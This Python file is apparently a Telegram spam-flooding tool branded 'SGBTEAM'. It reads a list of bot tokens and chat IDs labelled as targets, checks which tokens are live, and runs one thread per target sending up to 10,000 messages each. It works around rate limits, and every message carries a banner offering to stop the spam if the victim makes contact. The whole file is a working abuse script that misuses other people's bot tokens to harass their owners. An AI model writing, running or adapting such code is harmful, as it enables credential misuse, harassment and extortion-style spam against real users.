import json
import threading
import time
import random
import requests
from datetime import datetime
import sys

def check_target(token_info):
    token = token_info["token"]
    url = f'https://api.telegram.org/bot{token}/getme'
    response = requests.get(url)
    return response.json()

def send_request(token, user_id, text):
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text={text}&parse_mode=html'
    response = requests.get(url)
    return response.json()

def worker(task_id, token_info, sentences, stop_event, timeout, looping):
    token = token_info["token"]
    id = token_info["id"]
    print(f"[+] [{id}] [Task {task_id} started]")

    for i in range(looping):
        # Text message for target
        text = f"{random.choice(sentences)}\n\n【 💀 𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐒𝐀𝐘𝐀 𝐉𝐈𝐊𝐀 𝐈𝐍𝐆𝐈𝐍 𝐃𝐈𝐇𝐄𝐍𝐓𝐈𝐊𝐀𝐍 𝐒𝐏𝐀𝐌𝐍𝐘𝐀 💀 】 \n【 https://t.me/xTwnk 】 "

        response = send_request(token, id, text)
        if(response['ok'] == True):
            print(f"[+] [{id}] [Task {task_id}] [{i}] [Status: {response['ok']}] [Message ID: {response['result']['message_id']}] [{ datetime.utcfromtimestamp(response['result']['date']).strftime('%H:%M:%S') }]")
            time.sleep(1)
        else:
            print(f"[-] [{id}] [Task {task_id}] [{i}] [Status: {response['ok']}] [Error Code: {response['error_code']}] [Message: {response['description']}]")
            if(response['error_code'] == 429):
                if(response['parameters']['retry_after'] >= timeout):
                    print(f"[-] [{id}] [Task {task_id}] [{i}] Task {task_id} retry exceed Timeout limit, stopping task...")
                    stop_event.set()
                    break

                print(f"[-] [{id}] [Task {task_id}] [{i}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                time.sleep(response['parameters']['retry_after'])

def main():
    print("""
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░██████╗░██████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░█
    █░██╔════╝██╔════╝░██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗░████║░█
    █░╚█████╗░██║░░██╗░██████╦╝░░░██║░░░█████╗░░███████║██╔████╔██║░█
    █░░╚═══██╗██║░░╚██╗██╔══██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░█
    █░██████╔╝╚██████╔╝██████╦╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║░█
    █░╚═════╝░░╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░█
    █░░░░░░░░░░░░░░░fb.com/twnku░░░░░github.com/twnku░░░░░░░░░░░░░░░█
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
      """)
  
    # Config
    threads = []
    stop_event = threading.Event()
    timeout = 900 # Timeout 900 seconds = 15 minutes (60 seconds = 1 minutes, 3600 seconds = 1 hours)
    looping = 10000 # Loop spamming per target
    target_filename = 'target.json' # Target token files
    word_list = 'word.json' # Random word list for spamming
    print(f"[Loop: {looping}x] [Timeout: {timeout} seconds]")
    
    # Load word.json
    with open(word_list, 'r') as file:
        print("[+] Checking Word List...")
        sentences = json.load(file)
    print("[+]",len(sentences), "Random word found.")
    # Load target.json
    with open(target_filename, 'r') as file:
        print("[+] Checking Target List...")
        target_data = json.load(file)
    print("[+]",len(target_data), "Target found, Checking target...")
    count_r = 0
    for i, token_info in enumerate(target_data):
        check_data_target = check_target(token_info)
        if(check_data_target['ok'] == False):
            print(f"[-] [DEAD] [{token_info['token']}]")
            target_data.remove(token_info)
            count_r += 1
        else:
            print(f"[+] [LIVE] [{token_info['token']}] [Username: {check_data_target['result']['username']}] [ID: {check_data_target['result']['id']}]")
    print(f"[-] {count_r} Target removed.")
  
    # Create and start threads
    for i, token_info in enumerate(target_data):
        thread = threading.Thread(target=worker, args=(i+1, token_info, sentences, stop_event, timeout, looping))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    print("[+] All tasks are done.")

if __name__ == "__main__":
    main()
